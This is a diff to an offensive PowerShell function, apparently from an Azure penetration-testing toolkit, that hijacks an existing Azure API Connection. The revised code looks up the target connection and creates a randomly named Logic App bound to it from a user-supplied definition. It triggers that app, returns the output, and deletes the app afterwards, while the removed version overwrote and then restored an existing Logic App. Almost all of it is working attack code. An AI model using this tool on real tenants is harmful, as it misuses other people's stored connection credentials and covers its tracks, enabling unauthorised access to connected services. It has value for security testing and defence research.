@@ -1,25 +1,39 @@
 ﻿
 
 #This function will perform the following actions:
-#Retrieve the original definition of a Logic App
-#Replace that Logic App with a user-specified definition
-#Trigger the new Logic App and retrieve any output
-#Restore the original Logic App definition
-Function Invoke-LogicAppConnectorHijack{
+#Obtain the details for a target API Connection
+#Plug those details and a specified Logic App definition into a suitable format for the Az PowerShell module
+#Create a new Logic App and trigger it
+#Poll the LA until it is finished and retrieve any output/errors
+#Delete the LA
+Function Invoke-APIConnectionHijack{
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$true, 
         HelpMessage="Name of the API Connection to hijack. Not necessary if you've hardcoded it into your new definition.")]
         [string]$connectionName = "",
 
-        [Parameter(Mandatory=$true,
-        HelpMessage="Logic App to target")]
+        [Parameter(Mandatory=$false,
+        HelpMessage="Name of Logic App to create. Default: Random 15 character name")]
         [string]$logicAppName = "",
 
         [Parameter(Mandatory=$true,
-        HelpMessage="New definition for the Logic App. Any connection names should be replaced with CONNECTION_PLACEHOLDER")]
+        HelpMessage="Resource Group for new Logic App")]
+        [string]$logicAppRG = "",
+
+        [Parameter(Mandatory=$true,
+        HelpMessage="Definition for the Logic App. Any connection names should be replaced with CONNECTION_PLACEHOLDER")]
         [string]$definitionPath = ""
     )
+
+    if($logicAppName -eq ""){
+         $logicAppName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+    }
+
+    $connector = Get-AzResource -Name $connectionName -ResourceType "Microsoft.Web/connections"
+    $connectorId = $connector.ResourceId
+    $connectorSub = $connector.ResourceId.Split("/")[1]
+    $connectorId2 = -join("/subscriptions/",$connectorSub, "/providers/Microsoft.Web/locations/",$connector.Location,"/managedApis/",$connectionName)
 
     #Get the new definition and replace any connection name placeholders. If the connection name is hardcoded then it'll just do nothing
     $newDefinition = ""
@@ -34,50 +48,42 @@ Function Invoke-LogicAppConnectorHijack{
     #Writing this to a file plays better with the Az module
     $replacedDefinition | Out-File -FilePath ".\new_definition.json"
 
-
-    $app = Get-AzLogicApp -Name $logicAppName
-
-    $logicAppRG = $app.Id.Split('/')[4]
-
-    #Save the original definition
-    $definition = $app.Definition.ToString()
-
-    if($app.Parameters.'$connections'.Value.$connectionName -eq $null){
-        Write-Error "Error trying to get values for provided connector, exiting"
-        break
-    }
-
     #Get the connection information and get it formatted into a JSON string
-    $connection = ($app.Parameters.'$connections'.Value.$connectionName).ToString()
+  
     $connectionString = '
     {
         "$connections": {
             "value": {
-                $placeholder 
+               CONNECTION_NAME: {
+                "connectionId":"CONNECTOR_ID",
+                "connectionName":"CONNECTION_NAME",
+                "id":"CONNECTOR_ID2"
+               }
             }
         }
     }'
-    
-    $connectionReplacement = "
-        $connectionName : $connection
-    "
 
-    $connectionString = $connectionString.Replace('$placeholder', $connectionReplacement)
+    $connectionString = $connectionString.Replace("CONNECTOR_ID2", $connectorId2)
+    $connectionString = $connectionString.Replace("CONNECTOR_ID", $connectorId)
+    $connectionString = $connectionString.Replace("CONNECTION_NAME", $connectionName)
+    
+
     #Writing it a file plays better with the Az module
     $connectionString | Out-File -FilePath ".\parameters.json"
 
-    Write-Output (-join("Targeting the ", $logicAppName, " logic app..."))
+    Write-Output (-join("Creating the ", $logicAppName, " logic app..."))
 
-    #Update the Logic App definition
-    try{Set-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -State "Enabled" -DefinitionFilePath ".\new_definition.json" -Force -ParameterFilePath ".\parameters.json" -ErrorAction Stop | Out-Null}
+    #Create a new Logic App
+    try{New-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -Location $connector.Location -State "Enabled" -DefinitionFilePath ".\new_definition.json" -ParameterFilePath ".\parameters.json" -ErrorAction Stop | Out-Null}
     catch{
-        Write-Warning "Failed to update Logic App definition, check your payload"
+        $_
+        Write-Warning "Failed to create Logic App, check your payload"
         Remove-Item -Path ".\parameters.json"
         Remove-Item -Path ".\new_definition.json"
         break
     }
 
-    Write-Output ("Overwrote the existing logic app...")
+    Write-Output ("Created the new logic app...")
    
     #Remove the temporary files that we created
     Remove-Item -Path ".\parameters.json"
@@ -91,15 +97,6 @@ Function Invoke-LogicAppConnectorHijack{
     Invoke-WebRequest -Method "POST" -Uri $endpoint | Out-Null
     Write-Output "Called the manual trigger endpoint..."
 
-    try{Set-AzLogicApp -ResourceGroupName $logicAppRG -Name $logicAppName -State "Enabled" -Definition $definition -Force -Parameters $app.Parameters -ErrorAction Stop | Out-Null}
-    catch{
-        Write-Warning "Failed to restore Logic App definition, writing definition to $logicAppName_old_definition.json"
-        #This shouldn't happen since the original definition should always be valid, but just to cover any corner cases 
-        #If restoring this way fails, then you may also be able to restore it by promoting the version under the Versions tab
-        $definition | Out-File -FilePath ".\$logicAppName_old_definition.json"
-    }
-    Write-Output "Restored the original logic app."
-
     $history = Get-AzLogicAppRunHistory -ResourceGroupName $logicAppRG -Name $logicAppName
     $mostRecent = $history[0]
 
@@ -109,6 +106,7 @@ Function Invoke-LogicAppConnectorHijack{
         $mostRecent = $history[0]
     }
 
+    #This assumes that the output will be named "result"
     if($mostRecent.Outputs -ne $null){
         Write-Output "Output from Logic App run:"
         Write-Output $mostRecent.Outputs.result.Value.ToString()
@@ -118,6 +116,15 @@ Function Invoke-LogicAppConnectorHijack{
         Write-Output "Error from Logic App run:"
         Write-Output $mostRecent.Error.message
     }
+
+    #This should never fail, but if it does then the user will need to manually clean up the LA
+    try{Remove-AzLogicApp -ResourceGroupName $logicAppRG -Force -Name $logicAppName -ErrorAction Stop | Out-Null}
+    catch{
+        Write-Warning "Failed to clean up Logic App!"
+        break
+    }
+
+    Write-Output "Successfully cleaned up Logic App"
 
 }
 
